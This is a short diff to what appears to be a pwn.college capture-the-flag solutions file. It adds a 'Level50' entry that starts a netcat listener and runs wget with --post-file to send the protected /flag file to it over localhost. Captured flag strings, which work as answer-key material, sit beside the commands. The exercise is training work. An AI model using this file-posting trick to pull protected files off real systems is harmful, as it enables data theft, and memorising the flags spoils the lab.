@@ -152,6 +152,13 @@ pwn.college{cZqwJ2_7WV58QAM_3yykrJRzgGn.0VM4EDLwIzW}
 /bin/python /flag
 pwn.college{8y6gtiOYBGpKUUiwveBY6gTIN-H.0FN4EDLwIzW}
 
+## Level50
+Term1:
+nc -lp 80
+pwn.college{cYHRC-_11AQF8K4QK218hmJ4u9X.0lM5EDLwIzW}
+
+Term2:
+/bin/wget --post-file=/flag http://localhost
 
 
 
